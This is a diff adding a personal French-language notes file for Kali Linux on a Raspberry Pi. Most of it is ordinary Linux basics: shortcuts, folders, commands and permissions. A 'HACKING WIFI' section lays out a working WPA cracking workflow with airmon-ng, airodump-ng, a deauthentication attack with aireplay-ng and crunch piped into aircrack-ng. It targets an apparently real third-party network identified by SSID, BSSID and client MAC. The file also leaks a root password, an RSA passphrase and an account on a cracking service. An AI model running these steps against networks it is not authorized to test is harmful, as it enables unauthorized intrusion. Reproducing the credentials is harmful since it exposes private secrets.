@@ -1,0 +1,181 @@
+root
+koortey
+rpikali : 192.168.1.25
+
+
+Réseau
+ip : 192.168.1.93
+Netmask : 255.255.255.0
+Routeur : 192.168.1.254
+
+Nom kali : rpikali
+Restart wifi connexion : service network-manager restart
+
+Text editor : edit
+Install : vlc
+
+
+Problème wifi
+
+cd /etc/NetworkManager
+ls -l
+
+nano NetworkManager.conf
+managed=false > managed=true
+service network-manager restart
+TO TEST > ping google.com
+
+
+
+HACKING WIFI
+
+ifconfig
+
+airmon-ng check kill
+
+airmon-ng start wlan0
+
+ifconfig > check wifi card is listening
+
+airodump-ng wlan0mon > check all wifi access points
+
+airodump-ng -c [channel number] --bssid XX:XX:XX:XX:XX:XX -w output wlan0mon
+> On récupère l'ensemble des packets émis et reçus + les clients connectés au point d'accès.
+> A partir de là, la tactique va être de déconnecter un des clients actuellement connecté au point d'accès afin qu'il essaye de se reconnecter et on va écouter ce qu'il se passe entre ces deux périphériques afin de récupérer la PTK (cf 4 ways handshake) 
+> Nouvel onglet + nouvel instance pour ne pas perdre les infos de la dernière connexion
+
+aireplay-ng -0 1 -a XX:XX:XX:XX:XX:XX -c ADRESSE MAC wlan0mon
+> -0 pour spécifier qu'on envoie un paquet de désauthentification au client qui envoie le plus de paquet
+> Le tout pour récupérer le handshake WPA
+
+SFR_A5F0
+BSSID 60:35:C0:29:A5:F6
+STATION C8:3C:85:3C:CC:71
+WPA handshake: 60:35:C0:29:A5:F6 
+_BashedGrooveWiFi 
+
+crunch 8 25 abcdefghijklmnopqrstuvwxyz0123456789 | aircrack-ng -w - -b 60:35:C0:29:A5:F6 output-09.cap
+Ou *.cap à la fin 
+
+| shift + alt + L
+
+scp root@192.168.1.93:output-01.cap /Users/lucasmarcialis/Desktop
+16 times faster on Mac and a lot faster on following address
+	
+https://cr4ck.me/
+6S5DFFKV
+sfr_a5f0@maildrop.cc
+EMPTY - no results - failed
+
+Passphrase rsa : zangetzu
+
+
+
+
+
+TERMINAL SHORTCUTS
+
+Ctrl + R > Recherche commande
+Ctrl + L > Efface le contenu de la console > clear
+Ctrl + D > Envoie le message E0F à la console > exit
+Shift + PgUp > Remonte dans les messages envoyés > Flèche haut
+Shift + PgDown > Pareil mais pour redescendre
+Ctrl + A > Ramène le curseur au début de la commande
+Ctrl + E > Ramène le curseur à la fin de la commande
+Ctrl + U > Supprime tout ce qui se trouve à gauche du curseur
+Ctrl + K > Supprime tout ce qui se trouve à droite du curseur
+Ctrl + W > Supprime le premier mot situé à gauche du curseur
+Ctrl + Y > Si vous avez supprimé du texte, alors ce raccourci collera le texte que vous venez de supprimer
+Ctrl + C > pour arrêter n'importe quelle commande
+
+
+LINUX FOLDERS
+
+bin : contient des programmes (exécutables) susceptibles d'être utilisés par tous les utilisateurs de la machine.
+
+boot : fichiers permettant le démarrage de Linux.
+
+dev : fichiers contenant les périphériques. En fait – on en reparlera plus tard – ce dossier contient des sous-dossiers qui « représentent » chacun un périphérique. On y retrouve ainsi par exemple le fichier qui représente le lecteur CD.
+
+etc : fichiers de configuration.
+
+home : répertoires personnels des utilisateurs. On en a déjà parlé un peu avant : c'est dans ce dossier que vous placerez vos fichiers personnels, à la manière du dossierMes documents de Windows.
+
+LINUX COMMANDS 1
+
+pwd > print work directory
+ls -all = ls -a > show all files & folders
+ls -f > indique le type d'éléments	
+ls -l > affiche une liste détaillant chaque élément du dossier
+ls -h > afficher la taille en Ko, Mo, Go
+ls -t > trier par date de dernière modification
+ls -r > renverse l'ordre d'affichage
+ls -larth > contient toutes les options ci-dessus
+cd ~ (all + n) > retour au dossier root
+Use tab to autocomplete
+du > Disk usage
+du -h > disk usage for humans
+du -a > afficher taille des dossiers et des fichiers
+which + command > donne l'emplacement d'une commande
+
+LINUX COMMANDS 2
+
+Cat > permet d'afficher tout le contenu d'un fichier dans la console d'un coup
+Cd ..+/
+
+Less > affiche un fichier par pagination
+d : affiche les onze lignes suivantes (soit une moitié d'écran). C'est un peu l'intermédiaire entreEspace(tout un écran) etEntrée(une seule ligne).
+b : retourne en arrière d'un écran.
+Vous pouvez aussi appuyer sur la touchePage Up.
+y : retourne d'une ligne en arrière.
+Vous pouvez aussi appuyer sur la toucheFlèche vers le haut.
+u : retourne en arrière d'une moitié d'écran (onze lignes).
+q : arrête la lecture du fichier. Cela met fin à la commande less
+
+Head > afficher le début d'un fichier
+Tail > afficher la fin d'un fichier
+Tail -n XX > afficher la fin des XX lignes d'un fichier
+Tail -f > pour follow l'évolution du fichier // ctrl + C pour arrêter la commande
+
+Touch fichier.txt > créer un fichier avec le format du fichier
+Mkdir > créer un dossier
+Mkdir mondossier monsousdossier > créer mon dossier avec à l'intérieur monsousdossier
+Mkdir -p dossier/sous-dossier/sous-sous-dossier > créer tous les dossier intermédiaires
+
+Cp nomFichierCopié nomCopieFichierCopié > copier un fichier
+Cp nomFichier monDossier/nomFichierCopié > copier un fichier dans monDossier sous le nom fichierCopié
+Cp -R nomDossier > Copie le dossier et ses sous-dossiers
+Cp *.txt monDossier/ > copie tous les fichiers .txt dans un sous-dossier monDossier/
+
+Mv nomFichier monDossier/ > 
+
+Rm nomFichier > remove nomFichier
+Rm -f > mode gros boudin : force la suppression
+Rm -v > demande à la commande ce qu'il est en train de faire
+Rm -r > supprimer un dossier et son contenu
+Rm -d nom > remove nom - fichier ou folder si le fichier est vide
+
+Ln > créer des liens entre les fichiers
+Ln -s file1 file2 > lien symbolique = file2 symboliquement autre couleur que file1
+
+
+LES DROITS
+
+Sudo su > devenir super user
+Adduser > ajouter un utilisateur
+Deluser > supprimer un utilisateur
+Deluser --remove-home nomUser
+Addgroup > créer un groupe
+Usermod > Modifier un utilisateur
+Usermod -l > renomme l'utilisateur
+Usermod -g > change l'utilisateur de groupe
+Delgroup > supprimer un groupe
+Chown > changer le propriétaire d'un fichier
+Chgrp > changer le groupe propriétaire d'un fichier
+Chgrp -R > affecter récursive ment les sous-dossiers
+Chmod > modifier les droits d'accès
+	d (Directory) : indique si l'élément est un dossier ;
+	l (Link) : indique si l'élément est un lien (raccourci) ;
+	r (Read) : indique si on peut lire l'élément ;
+	w (Write) : indique si on peut modifier l'élément ;
+	x (eXecute) : si c'est un fichier, « x » indique qu'on peut l'exécuter. Ce n'est utile que pour les fichiers exécutables 	(programmes et scripts). Si c'est un dossier, « x » indique qu'on peut le « traverser », c'est-à-dire qu'on peut voir les sous-	dossiers qu'il contient si on a le droit de lecture dessus.
